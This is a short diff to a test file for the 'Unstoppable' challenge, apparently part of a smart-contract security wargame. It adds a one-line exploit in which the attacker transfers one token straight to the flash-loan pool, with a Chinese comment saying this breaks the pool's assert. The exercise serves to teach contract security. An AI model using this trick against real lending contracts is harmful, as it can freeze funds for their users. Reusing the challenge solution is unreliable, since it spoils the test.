@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //轉一顆到flash loan 讓assert失效
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
